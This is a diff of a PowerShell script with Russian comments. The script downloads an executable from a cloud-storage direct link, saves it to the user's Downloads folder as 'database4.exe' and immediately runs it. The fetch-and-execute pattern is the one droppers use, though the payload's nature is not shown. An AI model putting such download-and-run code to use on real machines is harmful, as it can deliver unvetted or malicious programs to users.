@@ -12,16 +12,19 @@ try {
         throw "Прямая ссылка не получена"
     }
 
-    # Путь для сохранения временного файла
-    $tempFile = "$env:TEMP\yadisk_temp.exe"
+    # Путь к папке "Загрузки" текущего пользователя
+    $downloadsPath = [Environment]::GetFolderPath('Downloads')
 
-    Write-Host "`n[!] Скачиваю файл..." -ForegroundColor Cyan
-    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFile
+    # Полный путь для сохранения файла
+    $savePath = Join-Path -Path $downloadsPath -ChildPath "database4.exe"
 
-    Write-Host "[+] Файл сохранён: $tempFile"
+    Write-Host "`n[!] Скачиваю файл в $savePath ..." -ForegroundColor Cyan
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $savePath
+
+    Write-Host "[+] Файл сохранён: $savePath"
     Write-Host "[*] Запускаю файл..." -ForegroundColor Green
 
-    Start-Process -FilePath $tempFile -Wait
+    Start-Process -FilePath $savePath -Wait
 }
 catch {
     Write-Error "Ошибка при скачивании или запуске: $_"
